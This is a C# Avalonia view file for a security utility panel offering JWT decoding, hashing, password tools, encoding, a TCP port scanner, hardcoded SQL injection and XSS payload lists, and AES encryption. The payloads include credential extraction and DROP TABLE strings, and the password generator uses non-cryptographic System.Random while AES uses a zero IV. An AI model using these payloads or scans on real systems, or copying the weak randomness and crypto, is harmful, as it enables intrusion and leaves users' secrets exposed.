using Avalonia.Controls;
using Avalonia.Markup.Xaml;
using Avalonia.Controls.Primitives;
using System.Security.Cryptography;
using System.Text;
using System;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;

namespace screenshareav.Views
{
    public partial class EncryptionToolsView : UserControl
    {
        private TextBox? _jwtInput;
        private Button? _decodeJwtBtn;
        private TextBlock? _jwtDecoded;
        private TextBox? _hashInput;
        private ComboBox? _hashAlgoCombo;
        private Button? _hashBtn;
        private Button? _copyHashBtn;
        private TextBox? _hashResult;
        private TextBox? _passwordInput;
        private Button? _analyzePasswordBtn;
        private TextBlock? _passwordStrengthResult;
        private TextBox? _passwordLengthInput;
        private CheckBox? _includeUppercase;
        private CheckBox? _includeLowercase;
        private CheckBox? _includeNumbers;
        private CheckBox? _includeSymbols;
        private Button? _generatePasswordBtn;
        private Button? _copyPasswordBtn;
        private TextBox? _generatedPassword;
        private TextBox? _encodingInput;
        private Button? _base64EncodeBtn;
        private Button? _base64DecodeBtn;
        private Button? _urlEncodeBtn;
        private Button? _urlDecodeBtn;
        private TextBox? _encodingResult;
        private TextBox? _scanTargetInput;
        private TextBox? _startPortInput;
        private TextBox? _endPortInput;
        private Button? _scanPortsBtn;
        private TextBlock? _portScanResults;
        private Button? _sqlInjectionBtn;
        private Button? _xssPayloadsBtn;
        private Button? _clearPayloadsBtn;
        private TextBox? _payloadResults;
        private TextBox? _encryptInput;
        private TextBox? _encryptKey;
        private Button? _aesEncryptBtn;
        private Button? _aesDecryptBtn;
        private TextBox? _encryptResult;

        public EncryptionToolsView()
        {
            AvaloniaXamlLoader.Load(this);
            InitializeControls();
            AttachEventHandlers();
        }

        private void InitializeControls()
        {
            _jwtInput = this.FindControl<TextBox>("JwtInput");
            _decodeJwtBtn = this.FindControl<Button>("DecodeJwtBtn");
            _jwtDecoded = this.FindControl<TextBlock>("JwtDecoded");
            _hashInput = this.FindControl<TextBox>("HashInput");
            _hashAlgoCombo = this.FindControl<ComboBox>("HashAlgoCombo");
            _hashBtn = this.FindControl<Button>("HashBtn");
            _copyHashBtn = this.FindControl<Button>("CopyHashBtn");
            _hashResult = this.FindControl<TextBox>("HashResult");
            _passwordInput = this.FindControl<TextBox>("PasswordInput");
            _analyzePasswordBtn = this.FindControl<Button>("AnalyzePasswordBtn");
            _passwordStrengthResult = this.FindControl<TextBlock>("PasswordStrengthResult");
            _passwordLengthInput = this.FindControl<TextBox>("PasswordLengthInput");
            _includeUppercase = this.FindControl<CheckBox>("IncludeUppercase");
            _includeLowercase = this.FindControl<CheckBox>("IncludeLowercase");
            _includeNumbers = this.FindControl<CheckBox>("IncludeNumbers");
            _includeSymbols = this.FindControl<CheckBox>("IncludeSymbols");
            _generatePasswordBtn = this.FindControl<Button>("GeneratePasswordBtn");
            _copyPasswordBtn = this.FindControl<Button>("CopyPasswordBtn");
            _generatedPassword = this.FindControl<TextBox>("GeneratedPassword");
            _encodingInput = this.FindControl<TextBox>("EncodingInput");
            _base64EncodeBtn = this.FindControl<Button>("Base64EncodeBtn");
            _base64DecodeBtn = this.FindControl<Button>("Base64DecodeBtn");
            _urlEncodeBtn = this.FindControl<Button>("UrlEncodeBtn");
            _urlDecodeBtn = this.FindControl<Button>("UrlDecodeBtn");
            _encodingResult = this.FindControl<TextBox>("EncodingResult");
            _scanTargetInput = this.FindControl<TextBox>("ScanTargetInput");
            _startPortInput = this.FindControl<TextBox>("StartPortInput");
            _endPortInput = this.FindControl<TextBox>("EndPortInput");
            _scanPortsBtn = this.FindControl<Button>("ScanPortsBtn");
            _portScanResults = this.FindControl<TextBlock>("PortScanResults");
            _sqlInjectionBtn = this.FindControl<Button>("SqlInjectionBtn");
            _xssPayloadsBtn = this.FindControl<Button>("XssPayloadsBtn");
            _clearPayloadsBtn = this.FindControl<Button>("ClearPayloadsBtn");
            _payloadResults = this.FindControl<TextBox>("PayloadResults");
            _encryptInput = this.FindControl<TextBox>("EncryptInput");
            _encryptKey = this.FindControl<TextBox>("EncryptKey");
            _aesEncryptBtn = this.FindControl<Button>("AesEncryptBtn");
            _aesDecryptBtn = this.FindControl<Button>("AesDecryptBtn");
            _encryptResult = this.FindControl<TextBox>("EncryptResult");
        }

        private void AttachEventHandlers()
        {
            if (_decodeJwtBtn != null) _decodeJwtBtn.Click += DecodeJwtBtn_Click;
            if (_hashBtn != null) _hashBtn.Click += HashBtn_Click;
            if (_copyHashBtn != null) _copyHashBtn.Click += CopyHashBtn_Click;
            if (_analyzePasswordBtn != null) _analyzePasswordBtn.Click += AnalyzePasswordBtn_Click;
            if (_generatePasswordBtn != null) _generatePasswordBtn.Click += GeneratePasswordBtn_Click;
            if (_copyPasswordBtn != null) _copyPasswordBtn.Click += CopyPasswordBtn_Click;
            if (_base64EncodeBtn != null) _base64EncodeBtn.Click += Base64EncodeBtn_Click;
            if (_base64DecodeBtn != null) _base64DecodeBtn.Click += Base64DecodeBtn_Click;
            if (_urlEncodeBtn != null) _urlEncodeBtn.Click += UrlEncodeBtn_Click;
            if (_urlDecodeBtn != null) _urlDecodeBtn.Click += UrlDecodeBtn_Click;
            if (_scanPortsBtn != null) _scanPortsBtn.Click += ScanPortsBtn_Click;
            if (_sqlInjectionBtn != null) _sqlInjectionBtn.Click += SqlInjectionBtn_Click;
            if (_xssPayloadsBtn != null) _xssPayloadsBtn.Click += XssPayloadsBtn_Click;
            if (_clearPayloadsBtn != null) _clearPayloadsBtn.Click += ClearPayloadsBtn_Click;
            if (_aesEncryptBtn != null) _aesEncryptBtn.Click += AesEncryptBtn_Click;
            if (_aesDecryptBtn != null) _aesDecryptBtn.Click += AesDecryptBtn_Click;
        }

        private void DecodeJwtBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_jwtInput == null || _jwtDecoded == null) return;
            try
            {
                var text = _jwtInput.Text ?? string.Empty;
                var parts = text.Split('.');
                if (parts.Length < 2) { _jwtDecoded.Text = "Invalid JWT"; return; }
                
                string Decode(string s) => Encoding.UTF8.GetString(Convert.FromBase64String(PadBase64(s ?? string.Empty)));
                
                var header = JsonSerializer.Deserialize<JsonElement>(Decode(parts[0]));
                var payload = JsonSerializer.Deserialize<JsonElement>(Decode(parts[1]));
                
                var formattedHeader = JsonSerializer.Serialize(header, new JsonSerializerOptions { WriteIndented = true });
                var formattedPayload = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = true });
                
                _jwtDecoded.Text = $"HEADER:\n{formattedHeader}\n\nPAYLOAD:\n{formattedPayload}\n\nSIGNATURE:\n{(parts.Length > 2 ? parts[2] : "No signature")}";
            }
            catch { _jwtDecoded.Text = "Invalid JWT format."; }
        }

        private string PadBase64(string s) => s.PadRight(s.Length + (4 - s.Length % 4) % 4, '=');

        private void HashBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_hashInput == null || _hashResult == null || _hashAlgoCombo == null) return;
            var text = _hashInput.Text ?? string.Empty;
            var algoIndex = _hashAlgoCombo.SelectedIndex;
            
            try
            {
                string hash = algoIndex switch
                {
                    0 => ComputeHashSHA256(text), // SHA256
                    1 => ComputeHashSHA1(text),   // SHA1
                    2 => ComputeHashSHA512(text), // SHA512
                    3 => ComputeHashMD5(text),    // MD5
                    _ => ComputeHashSHA256(text)
                };
                _hashResult.Text = hash;
            }
            catch (Exception ex)
            {
                _hashResult.Text = $"Error: {ex.Message}";
            }
        }

        private string ComputeHashSHA256(string input)
        {
            using var hash = SHA256.Create();
            var bytes = hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private string ComputeHashSHA1(string input)
        {
            using var hash = SHA1.Create();
            var bytes = hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private string ComputeHashSHA512(string input)
        {
            using var hash = SHA512.Create();
            var bytes = hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private string ComputeHashMD5(string input)
        {
            using var hash = MD5.Create();
            var bytes = hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private async void CopyHashBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_hashResult?.Text != null)
            {
                try
                {
                    var clipboard = TopLevel.GetTopLevel(this)?.Clipboard;
                    if (clipboard != null)
                        await clipboard.SetTextAsync(_hashResult.Text);
                }
                catch { }
            }
        }

        private void AnalyzePasswordBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_passwordInput == null || _passwordStrengthResult == null) return;
            
            var password = _passwordInput.Text ?? "";
            var analysis = AnalyzePasswordStrength(password);
            _passwordStrengthResult.Text = analysis;
        }

        private string AnalyzePasswordStrength(string password)
        {
            if (string.IsNullOrEmpty(password)) return "No password entered";
            
            var score = 0;
            var feedback = new List<string>();
            
            // Length check
            if (password.Length >= 12) { score += 2; feedback.Add("✓ Good length (12+ chars)"); }
            else if (password.Length >= 8) { score += 1; feedback.Add("⚠ Moderate length (8+ chars)"); }
            else feedback.Add("✗ Too short (less than 8 chars)");
            
            // Character variety
            if (Regex.IsMatch(password, @"[A-Z]")) { score += 1; feedback.Add("✓ Contains uppercase"); }
            else feedback.Add("✗ Missing uppercase letters");
            
            if (Regex.IsMatch(password, @"[a-z]")) { score += 1; feedback.Add("✓ Contains lowercase"); }
            else feedback.Add("✗ Missing lowercase letters");
            
            if (Regex.IsMatch(password, @"\d")) { score += 1; feedback.Add("✓ Contains numbers"); }
            else feedback.Add("✗ Missing numbers");
            
            if (Regex.IsMatch(password, @"[!@#$%^&*(),.?\"":{}|<>]")) { score += 1; feedback.Add("✓ Contains symbols"); }
            else feedback.Add("✗ Missing special characters");
            
            // Common patterns
            if (Regex.IsMatch(password, @"(.)\1{2,}")) { score -= 1; feedback.Add("⚠ Contains repeating characters"); }
            if (Regex.IsMatch(password, @"(abc|123|qwe|password|admin)", RegexOptions.IgnoreCase)) { score -= 2; feedback.Add("✗ Contains common patterns"); }
            
            var strength = score switch
            {
                >= 5 => "STRONG",
                >= 3 => "MODERATE", 
                >= 1 => "WEAK",
                _ => "VERY WEAK"
            };
            
            return $"Strength: {strength} (Score: {Math.Max(0, score)}/6)\n" + string.Join("\n", feedback);
        }

        private void GeneratePasswordBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_generatedPassword == null) return;
            
            var length = 16;
            if (int.TryParse(_passwordLengthInput?.Text, out var parsedLength) && parsedLength > 0 && parsedLength <= 128)
                length = parsedLength;
            
            var chars = "";
            if (_includeUppercase?.IsChecked == true) chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            if (_includeLowercase?.IsChecked == true) chars += "abcdefghijklmnopqrstuvwxyz";
            if (_includeNumbers?.IsChecked == true) chars += "0123456789";
            if (_includeSymbols?.IsChecked == true) chars += "!@#$%^&*(),.?\":{}|<>";
            
            if (string.IsNullOrEmpty(chars))
            {
                _generatedPassword.Text = "Please select at least one character type";
                return;
            }
            
            var password = new StringBuilder();
            var random = new Random();
            for (int i = 0; i < length; i++)
            {
                password.Append(chars[random.Next(chars.Length)]);
            }
            
            _generatedPassword.Text = password.ToString();
        }

        private async void CopyPasswordBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_generatedPassword?.Text != null)
            {
                try
                {
                    var clipboard = TopLevel.GetTopLevel(this)?.Clipboard;
                    if (clipboard != null)
                        await clipboard.SetTextAsync(_generatedPassword.Text);
                }
                catch { }
            }
        }

        private void Base64EncodeBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encodingInput == null || _encodingResult == null) return;
            try
            {
                var bytes = Encoding.UTF8.GetBytes(_encodingInput.Text ?? "");
                _encodingResult.Text = Convert.ToBase64String(bytes);
            }
            catch (Exception ex)
            {
                _encodingResult.Text = $"Error: {ex.Message}";
            }
        }

        private void Base64DecodeBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encodingInput == null || _encodingResult == null) return;
            try
            {
                var bytes = Convert.FromBase64String(_encodingInput.Text ?? "");
                _encodingResult.Text = Encoding.UTF8.GetString(bytes);
            }
            catch (Exception ex)
            {
                _encodingResult.Text = $"Error: {ex.Message}";
            }
        }

        private void UrlEncodeBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encodingInput == null || _encodingResult == null) return;
            try
            {
                _encodingResult.Text = Uri.EscapeDataString(_encodingInput.Text ?? "");
            }
            catch (Exception ex)
            {
                _encodingResult.Text = $"Error: {ex.Message}";
            }
        }

        private void UrlDecodeBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encodingInput == null || _encodingResult == null) return;
            try
            {
                _encodingResult.Text = Uri.UnescapeDataString(_encodingInput.Text ?? "");
            }
            catch (Exception ex)
            {
                _encodingResult.Text = $"Error: {ex.Message}";
            }
        }

        private async void ScanPortsBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_scanTargetInput == null || _portScanResults == null) return;
            
            var target = _scanTargetInput.Text?.Trim();
            if (string.IsNullOrWhiteSpace(target))
            {
                _portScanResults.Text = "Please enter a target IP or hostname";
                return;
            }
            
            if (!int.TryParse(_startPortInput?.Text, out var startPort) || startPort < 1 || startPort > 65535)
                startPort = 80;
            
            if (!int.TryParse(_endPortInput?.Text, out var endPort) || endPort < startPort || endPort > 65535)
                endPort = Math.Min(startPort + 10, 65535);
            
            _portScanResults.Text = "Scanning ports... This may take a moment.";
            
            var openPorts = new List<int>();
            var tasks = new List<Task>();
            
            for (int port = startPort; port <= endPort; port++)
            {
                int currentPort = port;
                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        using var client = new TcpClient();
                        await client.ConnectAsync(target, currentPort).WaitAsync(TimeSpan.FromMilliseconds(1000));
                        lock (openPorts)
                        {
                            openPorts.Add(currentPort);
                        }
                    }
                    catch
                    {
                        // Port is closed or filtered
                    }
                }));
            }
            
            await Task.WhenAll(tasks);
            
            if (openPorts.Any())
            {
                openPorts.Sort();
                _portScanResults.Text = $"Open ports on {target}:\n{string.Join(", ", openPorts)}\n\nTotal: {openPorts.Count} open ports found";
            }
            else
            {
                _portScanResults.Text = $"No open ports found on {target} in range {startPort}-{endPort}";
            }
        }

        private void SqlInjectionBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_payloadResults == null) return;
            
            var payloads = new[]
            {
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' /*",
                "' OR 1=1 --",
                "' UNION SELECT NULL --",
                "' UNION SELECT username, password FROM users --",
                "'; DROP TABLE users; --",
                "' OR SLEEP(5) --",
                "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
                "' AND 1=CONVERT(int, (SELECT @@version)) --"
            };
            
            _payloadResults.Text = "Common SQL Injection Payloads:\n\n" + string.Join("\n", payloads) +
                "\n\n⚠️ These are for educational purposes and authorized testing only!";
        }

        private void XssPayloadsBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_payloadResults == null) return;
            
            var payloads = new[]
            {
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>"
            };
            
            _payloadResults.Text = "Common XSS Payloads:\n\n" + string.Join("\n", payloads) +
                "\n\n⚠️ These are for educational purposes and authorized testing only!";
        }

        private void ClearPayloadsBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_payloadResults != null) _payloadResults.Text = "";
        }

        private void AesEncryptBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encryptInput == null || _encryptKey == null || _encryptResult == null) return;
            try
            {
                var keyText = _encryptKey.Text ?? string.Empty;
                var key = Encoding.UTF8.GetBytes(keyText.PadRight(32).Substring(0, 32));
                using var aes = Aes.Create();
                aes.Key = key;
                aes.IV = new byte[16]; // Zero IV for simplicity (not recommended for production)
                var encryptor = aes.CreateEncryptor();
                var inputBytes = Encoding.UTF8.GetBytes(_encryptInput.Text ?? string.Empty);
                var enc = encryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length);
                _encryptResult.Text = Convert.ToBase64String(enc);
            }
            catch (Exception ex)
            {
                _encryptResult.Text = $"Encryption error: {ex.Message}";
            }
        }

        private void AesDecryptBtn_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            if (_encryptInput == null || _encryptKey == null || _encryptResult == null) return;
            try
            {
                var keyText = _encryptKey.Text ?? string.Empty;
                var key = Encoding.UTF8.GetBytes(keyText.PadRight(32).Substring(0, 32));
                using var aes = Aes.Create();
                aes.Key = key;
                aes.IV = new byte[16]; // Zero IV for simplicity (not recommended for production)
                var decryptor = aes.CreateDecryptor();
                var encInput = _encryptInput.Text ?? string.Empty;
                var encBytes = Convert.FromBase64String(encInput);
                var dec = decryptor.TransformFinalBlock(encBytes, 0, encBytes.Length);
                _encryptResult.Text = Encoding.UTF8.GetString(dec);
            }
            catch (Exception ex)
            {
                _encryptResult.Text = $"Decryption error: {ex.Message}";
            }
        }
    }
}
